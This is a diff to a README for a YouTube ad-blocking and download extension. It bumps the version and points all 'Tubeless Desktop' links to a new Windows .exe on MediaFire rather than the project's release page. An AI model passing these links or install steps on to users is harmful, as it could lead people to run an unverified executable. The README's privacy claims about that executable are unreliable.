@@ -9,12 +9,12 @@
 </p>
 
 <p align="center">
-  Block ads, restore dislikes, and download media via <a href="https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file" target="_blank">Tubeless Desktop</a>.
+  Block ads, restore dislikes, and download media via <a href="https://www.mediafire.com/file/lcsdm3je7it9o9e/TubelessSetup-1.0.3.exe/file" target="_blank">Tubeless Desktop</a>.
 </p>
 
 <p align="center">
   <a href="https://github.com/qalva/tubeless/releases/latest"><img src="https://img.shields.io/badge/download-latest-orange.svg" /></a>
-  <img src="https://img.shields.io/badge/version-4.0.2-blue.svg" />
+  <img src="https://img.shields.io/badge/version-4.0.3-blue.svg" />
   <img src="https://img.shields.io/badge/license-MIT-green.svg" />
 </p>
 
@@ -22,7 +22,7 @@
 
 ## Overview
 
-The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
+The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/lcsdm3je7it9o9e/TubelessSetup-1.0.3.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
 
 ---
 
@@ -48,6 +48,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 8. [Disclaimer](#disclaimer)
 9. [Architecture](#architecture)
 10. [Changelog](#changelog)
+    - [[4.0.3] - 2026-05-19](#403---2026-05-19)
     - [[4.0.2] - 2026-05-18](#402---2026-05-18)
     - [[4.0.1] - 2026-05-17](#401---2026-05-17)
     - [[4.0.0] - 2026-05-15](#400---2026-05-15)
@@ -86,7 +87,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 
 ### Media Tools
 
-- Built-in Downloader: Video, audio, subtitles, thumbnails (Requires <a href="https://www.mediafire.com/file/1aiwbv7mkrukpio/Tubeless_Desktop.exe/file" target="_blank">Tubeless Desktop</a>)  
+- Built-in Downloader: Video, audio, subtitles, thumbnails (Requires <a href="https://www.mediafire.com/file/lcsdm3je7it9o9e/TubelessSetup-1.0.3.exe/file" target="_blank">Tubeless Desktop</a>)  
 - Drag & Drop Download: Drag any video link or element to download instantly  
 - Playlist Download Mode: Batch downloads  
 - Screenshot Capture: High-quality frame extraction  
@@ -113,7 +114,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 ## Download
 
 1. Download the [Tubeless Extension](https://github.com/qalva/tubeless/releases/latest) from the Releases page, scroll to the bottom of the latest release, then click the `.zip` file in the **Assets** section to download it.
-2. Download and install the [Tubeless Desktop](https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file) app to unlock media downloading in the Tubeless Extension. 
+2. Download and install the [Tubeless Desktop](https://www.mediafire.com/file/lcsdm3je7it9o9e/TubelessSetup-1.0.3.exe/file) app to unlock media downloading in the Tubeless Extension. 
 3. Open your browser (Chrome / Edge / Brave). 
 4. Toggle the three dots button in the toolbar and click on "Extensions" then click on "Manage Extensions" or navigate to `chrome://extensions` to reach the extensions page
 5. In extensions page, enable Developer Mode  
@@ -222,7 +223,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 
 - Fully local-first execution  
 - No telemetry or tracking  
-- No external servers. The [Tubeless Desktop](https://www.mediafire.com/file/vi8tolbhgvq2974/TubelessSetup-1.0.1.exe/file) app acts as a local-only server to download media on your machine. 
+- No external servers. The [Tubeless Desktop](https://www.mediafire.com/file/lcsdm3je7it9o9e/TubelessSetup-1.0.3.exe/file) app acts as a local-only server to download media on your machine. 
 - No data collection  
 
 Permissions are strictly functional:
@@ -253,6 +254,14 @@ Event-driven, modular, performance-first design.
 ---
 
 ## Changelog
+
+### [4.0.3] - 2026-05-19
+
+### Added
+- Dedicated Downloads Options Panel: Separated download-specific options into a clean, dedicated "Downloads" settings panel section, complete with native multi-language translation support.
+- General Preferences Synchronization: Enabled unified control over download quality and playlist mode across all download mechanisms (download hotkey, floating drop-to-download buttons, toolbar popup). Toggling Playlist Mode in the popup or options page now synchronizes settings immediately in real-time.
+- Smart Watch URLs Drag-and-Drop: Simplified drag-and-drop targets to streamlined "Download" actions.
+- Native Background Shell Notifications: Advanced toast activation handlers using raw absolute path parameters on Windows. Clicking completed download notifications (new, past, or playlists) now successfully launches files in your default player and folders in Windows Explorer, bypassing URL-encoding issues with brackets `[` and `]`.
 
 ### [4.0.2] - 2026-05-18
 
